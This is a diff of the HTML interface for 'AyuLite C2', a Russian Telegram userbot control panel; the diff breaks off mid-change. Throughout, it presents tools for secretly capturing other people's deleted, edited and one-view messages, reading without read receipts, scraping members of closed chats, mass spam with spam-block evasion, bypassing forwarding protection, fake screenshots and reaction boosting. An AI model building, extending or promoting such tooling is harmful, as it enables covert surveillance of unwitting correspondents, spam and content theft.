@@ -1,595 +1,315 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#0b0b0c">
-<title>AyuLite C2 — панель управления</title>
-<!-- Telegram Web App SDK -->
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;500;600&family=Golos+Text:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css?v=7.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#07080a">
+  <title>AyuLite C2 — Master Console</title>
+  
+  <!-- Telegram WebApp SDK -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <link rel="stylesheet" href="style.css?v=8.0">
 </head>
-<body id="top">
+<body>
 
-<header class="hdr">
-  <div class="container hdr-in">
-    <a class="logo" href="#top">AYULITE<span>·C2</span></a>
-    <div class="hdr-right">
-      <span class="status mono"><i class="dot on"></i>online</span>
-      <span class="chip-profile mono" id="profileChip">PRO</span>
-      <button class="btn btn-sm" id="hdrAddBtn" style="padding: 5px 11px; font-size: 11.5px;">+ Воркер</button>
-    </div>
-  </div>
-</header>
-
-<!-- ======= HERO ======= -->
-<div class="container">
-  <div class="hero">
-    <div class="reveal">
-      <div class="kicker">AYULITE C2 <b>/</b> MTPROTO 1.36.0</div>
-      <h1>Панель управления юзерботом</h1>
-      <p class="sub">Воркеры, модули и сессии Telegram в одном интерфейсе. 69 модулей, три тарифа — ничего лишнего.</p>
-      
-      <!-- ГЛАВНАЯ КНОПКА ДОБАВЛЕНИЯ АККАУНТА (БРОСАЕТСЯ В ГЛАЗА) -->
-      <div class="hero-cta">
-        <button class="btn btn-primary btn-lg btn-block" id="heroAdd" style="font-weight: 700; font-size: 15px; letter-spacing: .02em; box-shadow: 0 4px 20px rgba(214,249,75,.35);">+ Подключить аккаунт</button>
-        <a class="btn btn-block" href="#modules">Смотреть модули</a>
+  <!-- Top Sticky Header -->
+  <header class="app-header">
+    <div class="brand-wrap">
+      <div class="brand-logo">
+        <span>AYULITE</span>
+        <span class="brand-badge">C2 CORE</span>
       </div>
     </div>
-    <aside class="node-card reveal" aria-label="Состояние узла">
-      <div class="node-head"><span>УЗЕЛ C2</span><i class="dot on"></i></div>
-      <div class="node-row"><span>воркеры</span><b id="nodeActiveWorkers">0 активны</b></div>
-      <div class="node-row"><span>локов в кэше</span><b>3 910</b></div>
-      <div class="node-row"><span>uptime</span><b>99.9%</b></div>
-      <div class="node-row"><span>шифрование</span><b>AES-256</b></div>
-      <div class="node-row"><span>core</span><b>MTProto 1.36.0</b></div>
-    </aside>
-  </div>
-</div>
-
-<!-- ======= 01 PRICING ======= -->
-<section id="pricing">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">01</span><h2>Тарифы</h2></div>
-    <p class="sec-sub reveal">Оплата в Telegram Stars, TON или картой. Тариф применяется к аккаунту мгновенно.</p>
-    <div class="plans">
-      <article class="plan reveal">
-        <div class="plan-name">Pro</div>
-        <div class="price">49 ★<small>/ мес</small></div>
-        <ul>
-          <li>До 2 активных воркеров</li>
-          <li>Перехват удалений и правок (текст + фото)</li>
-          <li>Ghost-режим: скрытое чтение</li>
-          <li>Экспорт архивов до 50 МБ</li>
-        </ul>
-        <button class="btn btn-block" data-plan="Pro" data-key="pro" data-price="49 ★ / мес">Подключить Pro</button>
-      </article>
-      <article class="plan hot reveal">
-        <span class="tag">ОПТИМАЛЬНЫЙ</span>
-        <div class="plan-name">Premium</div>
-        <div class="price">99 ★<small>/ мес</small></div>
-        <ul>
-          <li>До 3 воркеров параллельно</li>
-          <li>Перехват сгорающих медиа (TTL)</li>
-          <li>Полный перехват удалений и правок</li>
-          <li>Экспорт архивов до 100 МБ</li>
-          <li>Ghost-режим скрытого мониторинга</li>
-        </ul>
-        <button class="btn btn-primary btn-block" data-plan="Premium" data-key="premium" data-price="99 ★ / мес">Выбрать Premium</button>
-      </article>
-      <article class="plan reveal">
-        <div class="plan-name">Ultimate</div>
-        <div class="price">199 ★<small>/ мес</small></div>
-        <ul>
-          <li>До 5 воркеров в Mesh-сети</li>
-          <li>Shadow Mirror: теневое зеркало чатов</li>
-          <li>TTL Grabber: фото и видео 1 view</li>
-          <li>Session Sentinel: защита сессий</li>
-          <li>Локальный AI Speech-to-Text</li>
-        </ul>
-        <button class="btn btn-block" data-plan="Ultimate" data-key="ultimate" data-price="199 ★ / мес">Активировать Ultimate</button>
-      </article>
+    <div class="header-status">
+      <div class="live-indicator">
+        <span class="status-dot"></span>
+        <span id="headerStatusText">Live</span>
+      </div>
+      <div class="tier-pill" id="userTierBadge">ULTIMATE</div>
     </div>
-  </div>
-</section>
+  </header>
 
-<!-- ======= 02 MODULES ======= -->
-<section id="modules">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">02</span><h2>Модули</h2></div>
-    <p class="sec-sub reveal">Каталог инструментов. Активно <b id="actCount">0</b> — тумблеры синхронизированы с вашим тарифом.</p>
+  <!-- =========================================================================
+       VIEW 1: ЛЕНТА АКТИВНОСТИ (ACTIVITY FEED)
+       ========================================================================= -->
+  <main class="view-container active" id="view-feed">
+    <!-- Search Bar -->
+    <div class="search-bar">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: var(--text-muted); flex-shrink: 0;"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+      <input type="text" class="search-input" id="feedSearchInput" placeholder="Поиск по сообщениям или именам...">
+    </div>
 
-    <div class="toolbar reveal">
-      <label class="search">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
-        <input type="text" id="search" placeholder="поиск: имя или команда" autocomplete="off">
-      </label>
-      <div class="filters" id="filters">
-        <button class="chip on" data-tier="all">Все<span></span></button>
-        <button class="chip" data-tier="pro">Pro<span></span></button>
-        <button class="chip" data-tier="premium">Premium<span></span></button>
-        <button class="chip" data-tier="ultimate">Ultimate<span></span></button>
-        <button class="chip ghost" id="enableAll">включить всё</button>
-        <button class="chip ghost" id="resetAll">сбросить</button>
+    <!-- Filter Pills -->
+    <div class="filter-pills">
+      <button class="pill-btn active" data-filter="all">Все перехваты</button>
+      <button class="pill-btn" data-filter="deleted">🗑 Удаленные</button>
+      <button class="pill-btn" data-filter="edited">✏️ Правки</button>
+      <button class="pill-btn" data-filter="ttl">🔥 Сгорающие (TTL)</button>
+      <button class="pill-btn" data-filter="reactions">⚡️ Реакции</button>
+    </div>
+
+    <!-- Live Intercept List -->
+    <div id="feedList">
+      <!-- Injected dynamically via app.js -->
+      <div style="text-align: center; padding: 40px 16px; color: var(--text-muted);">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 8px; opacity: 0.5;"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
+        <p>Слушатель MTProto ожидает входящие события...</p>
       </div>
     </div>
+  </main>
 
-    <div id="modList"></div>
-  </div>
-</section>
-
-<!-- ======= 03 NODES ======= -->
-<section id="nodes">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">03</span><h2>Узлы и сессии</h2></div>
-    <p class="sec-sub reveal">Состояние C2-сети в реальном времени.</p>
-    <div class="stats">
-      <div class="stat reveal"><b id="statWorkers">0</b><span>активных воркера</span></div>
-      <div class="stat reveal"><b>3 910</b><span>локов в кэше</span></div>
-      <div class="stat reveal"><b>99.9%</b><span>uptime mtproto</span></div>
-      <div class="stat reveal"><b>AES-256</b><span>шифрование</span></div>
+  <!-- =========================================================================
+       VIEW 2: СЕЙФ ДИАЛОГОВ (VAULT CHATS)
+       ========================================================================= -->
+  <main class="view-container" id="view-vault">
+    <div class="group-title">Перехваченные диалоги</div>
+    <div class="inset-card" id="vaultChatsCard">
+      <div style="text-align: center; padding: 36px 16px; color: var(--text-muted);" id="vaultChatsPlaceholder">
+        Загрузка диалогов Сейфа...
+      </div>
+      <div id="vaultChatsList"></div>
     </div>
-    <div class="sess-container" id="sessContainer">
-      <div class="sess reveal">
-        <div class="sess-row">
-          <i class="dot wait" id="sessDot"></i>
-          <div>
-            <div class="sess-name" id="sessName">Синхронизация…</div>
-            <div class="sess-meta" id="sessMeta">ожидание подключения устройства</div>
+
+    <div id="vaultConversationWrap" style="display: none;">
+      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px;">
+        <button class="btn-secondary" id="btnBackToChats" style="padding: 6px 12px; font-size: 12px;">← Все диалоги</button>
+        <span style="font-size: 12.5px; font-weight: 600;" id="activeChatTitle">Диалог</span>
+      </div>
+      <div class="inset-card" style="padding: 14px;" id="vaultMessagesStream"></div>
+    </div>
+  </main>
+
+  <!-- =========================================================================
+       VIEW 3: СТЕЛС & ЗАЩИТА (STEALTH & TRIGGERS)
+       ========================================================================= -->
+  <main class="view-container" id="view-stealth">
+    <div class="group-title">Скрытность и Перехват</div>
+    <div class="inset-card">
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon purple">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
           </div>
-          <span class="sess-state" id="sessState">idle</span>
-        </div>
-        <button class="sess-add" id="addDevice">+ подключить аккаунт (ayulite flow)</button>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ======= 04 SETTINGS ======= -->
-<section id="settings">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">04</span><h2>Настройки</h2></div>
-    <p class="sec-sub reveal">Профиль и системные параметры панели.</p>
-
-    <div class="set-row reveal">
-      <div><b>Активный профиль</b><p>Уровень доступа для бейджей и модулей.</p></div>
-      <div class="seg" id="segProfile">
-        <button data-p="pro" class="on">Pro</button>
-        <button data-p="premium">Premium</button>
-        <button data-p="ultimate">Ultimate</button>
-      </div>
-    </div>
-    <div class="set-row reveal">
-      <div><b>Тактильный отклик</b><p>Вибрация интерфейса (TWA HapticFeedback).</p></div>
-      <label class="sw"><input type="checkbox" id="optHaptics" checked><i></i></label>
-    </div>
-    <div class="set-row reveal">
-      <div><b>Сжатие логов (GZIP)</b><p>Экономия трафика при передаче пакетов.</p></div>
-      <label class="sw"><input type="checkbox" checked><i></i></label>
-    </div>
-    <div class="set-row reveal" style="border-bottom:none">
-      <div><b>Облачная синхронизация</b><p>Бэкап настроек модулей в шифрованное хранилище.</p></div>
-      <label class="sw"><input type="checkbox" checked><i></i></label>
-    </div>
-  </div>
-</section>
-
-<!-- ======= 05 TELEGRAM EXPERT PRO ======= -->
-<section id="expert">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">05</span><h2>Telegram Expert PRO</h2></div>
-    <p class="sec-sub reveal">Продвинутые модули парсинга, массовой рассылки и продвижения сетей аккаунтов (Архитектура Telegram Expert).</p>
-
-    <div class="plans" style="grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 16px;">
-      
-      <!-- Card 1: Scraper -->
-      <article class="plan reveal" style="border-color: rgba(214,249,75,.25);">
-        <div class="tag">PARSER</div>
-        <div class="plan-name">Парсер целевой аудитории</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Сбор участников, комментаторов и активных пользователей из любых открытых и закрытых чатов с фильтрацией ботов.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--acc); margin-bottom: 14px;">
-          .scrape @target_chat 500
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Фильтрация: Онлайн, Недавно, Скрытые</li>
-          <li>Экспорт базы в .txt и .json файлы</li>
-        </ul>
-      </article>
-
-      <!-- Card 2: Spintax Mailer -->
-      <article class="plan reveal" style="border-color: rgba(91,224,122,.25);">
-        <div class="tag" style="background: var(--ok);">BROADCASTER</div>
-        <div class="plan-name">Spintax Рассыльщик</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Массовая отправка сообщений по собранным базам с рандомизацией текста через шаблоны и авто-задержками.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--ok); margin-bottom: 14px;">
-          .broadcast {Привет|Хай} {бро|друг}!
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Рандомизация {вариант1|вариант2}</li>
-          <li>Защита от спамблока (рандомные паузы)</li>
-        </ul>
-      </article>
-
-      <!-- Card 3: Inviter -->
-      <article class="plan reveal" style="border-color: rgba(75,214,249,.25);">
-        <div class="tag" style="background: #4bd6f9;">INVITER</div>
-        <div class="plan-name">Массовый инвайтер</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Быстрое наполнение групп целевой аудиторией по списку юзернеймов с умным обходом приватности.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: #4bd6f9; margin-bottom: 14px;">
-          .invite @my_group
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Авто-скип приватных пользователей</li>
-          <li>Авто-ожидание при FloodWait</li>
-        </ul>
-      </article>
-
-      <!-- Card 4: Cloner -->
-      <article class="plan reveal" style="border-color: rgba(224,91,224,.25);">
-        <div class="tag" style="background: #e05be0;">CLONER</div>
-        <div class="plan-name">Клонер каналов</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Репликация контента с канала-донора в ваш канал: тексты, фото, видео и документы в один клик.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: #e05be0; margin-bottom: 14px;">
-          .clonechan @donor @target 50
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Хронологический порядок публикаций</li>
-          <li>Поддержка всех типов медиафайлов</li>
-        </ul>
-      </article>
-
-      <!-- Card 5: Spamblock Audit -->
-      <article class="plan reveal" style="border-color: rgba(249,168,75,.25);">
-        <div class="tag" style="background: #f9a84b;">AUDIT</div>
-        <div class="plan-name">Чекер спамблока</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Мгновенная проверка аккаунтов через официального @SpamBot на вечные и временные ограничения.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: #f9a84b; margin-bottom: 14px;">
-          .spamblock
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Диагностика ограничений отправки в ЛС</li>
-          <li>Сроки автоматического снятия мутов</li>
-        </ul>
-      </article>
-
-      <!-- Card 6: Reactions Booster -->
-      <article class="plan reveal" style="border-color: rgba(249,75,122,.25);">
-        <div class="tag" style="background: #f94b7a;">BOOSTER</div>
-        <div class="plan-name">Накрутка реакций</div>
-        <p style="font-size: 13.5px; color: var(--mut); margin: 10px 0 14px;">Массовая установка реакций 👍, 🔥, ❤️, ⚡️ на посты в каналах и чатах для создания видимости активности.</p>
-        <div style="background: rgba(0,0,0,.35); padding: 8px 12px; border-radius: 8px; border: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: #f94b7a; margin-bottom: 14px;">
-          .react 🔥
-        </div>
-        <ul style="margin: 0 0 16px;">
-          <li>Поддержка любых официальных эмодзи</li>
-          <li>Мгновенный отклик по реплаю</li>
-        </ul>
-      </article>
-
-    </div>
-  </div>
-</section>
-
-
-<!-- ======= 06 AYUVAULT ======= -->
-<section id="vault">
-  <div class="container">
-    <div class="sec-head reveal">
-      <span class="sec-no">06</span>
-      <h2>AyuVault</h2>
-    </div>
-    <p class="sec-sub reveal">Персональное хранилище удаленных сообщений и медиафайлов. Все перехваченные данные надежно изолированы внутри вашего аккаунта.</p>
-
-    <!-- Карточка статуса Telegram Форума -->
-    <div class="vault-forum-card reveal" id="vaultForumCard">
-      <div class="vfc-icon">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      </div>
-      <div class="vfc-body">
-        <div class="vfc-title" id="vaultForumTitle">Телеграм-сейф (Супергруппа)</div>
-        <div class="vfc-sub" id="vaultForumSub">Синхронизация с Telegram...</div>
-      </div>
-      <div class="vfc-actions">
-        <a class="btn btn-sm btn-primary" id="btnOpenTgForum" href="#" target="_blank" style="display:none;">🚀 Войти в Telegram</a>
-        <button class="btn btn-sm" id="btnSyncTgForum">⚡️ Создать Сейф</button>
-      </div>
-    </div>
-
-    <!-- Статистика категорий файлов -->
-    <div class="stats reveal" style="margin-top:16px;">
-      <div class="stat"><b id="vStatTotal">0</b><span>всего удалено</span></div>
-      <div class="stat"><b id="vStatPhoto">0</b><span>фото</span></div>
-      <div class="stat"><b id="vStatVoice">0</b><span>голосовых</span></div>
-      <div class="stat"><b id="vStatVideo">0</b><span>видео / кружки</span></div>
-      <div class="stat"><b id="vStatTtl">0</b><span>сгорающих TTL</span></div>
-    </div>
-
-    <!-- Контейнер Хаба Сейфа -->
-    <div class="vault-hub reveal" id="vaultHub">
-      
-      <!-- ВИД 1: СПИСОК ЧАТОВ -->
-      <div class="vault-chats-view" id="vaultChatsView">
-        <div class="vault-tabs" id="vaultScopeTabs">
-          <button class="chip on" data-scope="dm">Лички <span id="vBadgeDm">0</span></button>
-          <button class="chip" data-scope="groups">Группы <span id="vBadgeGroups">0</span></button>
-          <button class="chip" data-scope="channels">Каналы <span id="vBadgeChannels">0</span></button>
-        </div>
-
-        <div class="vault-chat-list" id="vaultChatList">
-          <div class="v-empty">Загрузка перехваченных переписок...</div>
-        </div>
-      </div>
-
-      <!-- ВИД 2: ДЕТАЛИ ДИАЛОГА С КАТЕГОРИЯМИ И МЕДИА -->
-      <div class="vault-detail-view" id="vaultDetailView" style="display:none;">
-        <div class="vd-header">
-          <button class="btn btn-sm" id="btnBackToChats">← Все диалоги</button>
-          <div class="vd-info">
-            <b id="vdTitle">Имя собеседника</b>
-            <span id="vdMeta">ID: 123456789</span>
-          </div>
-          <button class="btn btn-sm" id="btnOpenFakeshotModal" style="background:linear-gradient(135deg, #7839ee, #a855f7); border:none; color:#fff; font-weight:600; margin-left:auto;">📸 Fakeshot Pro</button>
-        </div>
-
-        <!-- Live 'Рентген' профиля собеседника -->
-        <div class="dossier-bar" id="vaultDossierBar">
-          <div class="dossier-header">
-            <span>📡 Рентген профиля (Live Dossier)</span>
-            <span id="dossierStatus" style="font-size:10px; color:#4bd6f9;">● ONLINE SYNC</span>
-          </div>
-          <div class="dossier-chips" id="dossierChips">
-            <span class="dossier-chip highlight">Загрузка данных MTProto...</span>
+          <div class="row-info">
+            <div class="row-title">Режим Призрака (Ghost Read)</div>
+            <div class="row-desc">Чтение сообщений без снятия галочек прочтения</div>
           </div>
         </div>
-
-        <!-- Action Faker: Непрерывная имитация активности -->
-        <div class="action-faker-bar" id="vaultActionFakerBar">
-          <span class="faker-label">⚡ Фейкер активности:</span>
-          <button class="faker-chip" data-action="typing">⌨️ Печатает...</button>
-          <button class="faker-chip" data-action="record-audio">🎙 Запись войса</button>
-          <button class="faker-chip" data-action="record-round">📹 Съемка кружка</button>
-          <button class="faker-chip" data-action="upload-document">📁 Загрузка файла</button>
-          <button class="faker-chip stop" data-action="cancel">⏹ Стоп</button>
-        </div>
-
-        <!-- Фильтры по типам сообщений и удалений -->
-        <div class="vault-filter-chips" id="vaultFilterChips">
-          <button class="vchip on" data-filter="all">Все</button>
-          <button class="vchip" data-filter="deleted">🗑 Удаленки</button>
-          <button class="vchip" data-filter="edited">✏️ Правки</button>
-          <button class="vchip" data-filter="ttl">⏳ Сгорающие</button>
-          <button class="vchip" data-filter="photo">🖼 Фото</button>
-          <button class="vchip" data-filter="video">🎥 Видео</button>
-          <button class="vchip" data-filter="voice">🎙 Войс</button>
-          <button class="vchip" data-filter="video_note">📹 Кружки</button>
-          <button class="vchip" data-filter="text">💬 Текст</button>
-        </div>
-
-        <div class="vault-messages-feed" id="vaultMessagesFeed">
-          <div class="v-empty">Загрузка перехваченных сообщений...</div>
-        </div>
+        <label class="switch">
+          <input type="checkbox" id="switchGhostRead">
+          <span class="slider"></span>
+        </label>
       </div>
 
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon red">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">Анти-Удаление (Anti-Delete)</div>
+            <div class="row-desc">Мгновенная фиксация удаленных сообщений в Сейф</div>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="switchAntiDelete" checked>
+          <span class="slider"></span>
+        </label>
+      </div>
+
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon amber">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">Анти-Правка (Anti-Edit)</div>
+            <div class="row-desc">Сохранение исходного текста до изменения</div>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="switchAntiEdit" checked>
+          <span class="slider"></span>
+        </label>
+      </div>
+
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon sky">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">TTL Sniper (1-View Перехват)</div>
+            <div class="row-desc">Сгорающие фото, видео и 1-view голосовые</div>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="switchAutoTtl" checked>
+          <span class="slider"></span>
+        </label>
+      </div>
+
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon green">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">Трекер Реакций (Reaction Spy)</div>
+            <div class="row-desc">Фиксация поставленных и снятых смайлов в ЛС</div>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="switchReactionSpy" checked>
+          <span class="slider"></span>
+        </label>
+      </div>
     </div>
-  </div>
-</section>
 
-<!-- ======= 07 MEDIA SNATCHER (ОБХОД NOFORWARDS) ======= -->
-<section id="snatcher">
-  <div class="container">
-    <div class="sec-head reveal"><span class="sec-no">07</span><h2>Media Snatcher (Обход noforwards)</h2></div>
-    <p class="sec-sub reveal">Прямая выгрузка закрытого контента в 1 клик без ссылок и пересылок в ваше «Избранное».</p>
-
-    <div class="plan reveal" style="border-color: rgba(75, 214, 249, 0.3); background: rgba(18, 20, 24, 0.7); padding: 20px; border-radius: 12px; margin-top: 15px;">
-      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">
-        <span class="tag" style="background: #4bd6f9; color: #000; font-weight: bold;">ZERO-CLICK RIPPER</span>
-        <button class="chip ghost" id="btnRefreshSnatcherChannels" style="font-size: 11px; padding: 4px 10px;">🔄 Загрузить каналы</button>
-      </div>
-
-      <div style="margin-bottom: 15px;">
-        <label style="display: block; font-size: 12px; color: var(--mut); margin-bottom: 6px;">Выберите закрытый канал или группу:</label>
-        <select id="snatcherChannelSelect" style="width: 100%; padding: 10px 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--line); border-radius: 8px; color: #fff; font-size: 13.5px; outline: none;">
-          <option value="">Нажмите «Загрузить каналы»...</option>
-        </select>
-      </div>
-
-      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
-        <div>
-          <label style="display: block; font-size: 12px; color: var(--mut); margin-bottom: 6px;">Количество постов:</label>
-          <select id="snatcherCountSelect" style="width: 100%; padding: 9px 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--line); border-radius: 8px; color: #fff; font-size: 13px; outline: none;">
-            <option value="5">Последние 5 постов</option>
-            <option value="10" selected>Последние 10 постов</option>
-            <option value="20">Последние 20 постов</option>
-            <option value="50">Последние 50 постов (макс.)</option>
-          </select>
+    <div class="group-title">Маршрутизация Сейфа</div>
+    <div class="inset-card">
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon purple">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">Pure Bot Delivery (Стелс)</div>
+            <div class="row-desc">Отправка отчетов строго через бота, аккаунт в безопасности</div>
+          </div>
         </div>
-        <div>
-          <label style="display: block; font-size: 12px; color: var(--mut); margin-bottom: 6px;">Куда отправить:</label>
-          <input type="text" value="«Избранное» (Saved Messages)" disabled style="width: 100%; padding: 9px 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--line); border-radius: 8px; color: var(--ok); font-size: 13px;">
+        <span class="tier-pill" style="color: var(--emerald);">АКТИВНО</span>
+      </div>
+      <div style="padding: 12px 16px;">
+        <button class="btn-primary" id="btnSyncVaultForum">🔄 Перепривязать ветки супергруппы-сейфа</button>
+      </div>
+    </div>
+  </main>
+
+  <!-- =========================================================================
+       VIEW 4: ФЕРМА АККАУНТОВ (FARM & MULTI-SESSION)
+       ========================================================================= -->
+  <main class="view-container" id="view-farm">
+    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+      <span class="group-title" style="margin: 0;">Подключенные сессии</span>
+      <button class="btn-secondary" id="btnAddSessionOpen" style="padding: 6px 12px; font-size: 12px;">+ Добавить</button>
+    </div>
+
+    <div id="farmAccountsList">
+      <!-- Injected via app.js -->
+    </div>
+  </main>
+
+  <!-- =========================================================================
+       VIEW 5: СИСТЕМА & ИНСТРУМЕНТЫ (SYSTEM & COCKPIT)
+       ========================================================================= -->
+  <main class="view-container" id="view-system">
+    <div class="group-title">Статус Системы</div>
+    <div class="inset-card">
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon green">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">Владелец C2 Console</div>
+            <div class="row-desc" id="systemOwnerText">ID: 7926138510</div>
+          </div>
         </div>
+        <span class="tier-pill" id="systemTierBadge">ULTIMATE</span>
       </div>
 
-      <button class="btn btn-primary btn-block" id="btnStartSnatch" style="background: #4bd6f9; color: #07080a; font-weight: bold; padding: 12px; border-radius: 8px; font-size: 14px; cursor: pointer;">
-        ⚡ Выгрузить защищенный контент
+      <div class="inset-row">
+        <div class="row-left">
+          <div class="row-icon sky">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"></ellipse><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path></svg>
+          </div>
+          <div class="row-info">
+            <div class="row-title">База Данных SQLite WAL</div>
+            <div class="row-desc" id="systemDbText">c2_database.db</div>
+          </div>
+        </div>
+        <span style="font-size: 12px; color: var(--emerald); font-weight: 600;">ACTIVE</span>
+      </div>
+    </div>
+
+    <div class="group-title">Быстрые Действия</div>
+    <div style="display: flex; flex-direction: column; gap: 8px;">
+      <button class="btn-secondary" id="btnOpenFakeshotModal">
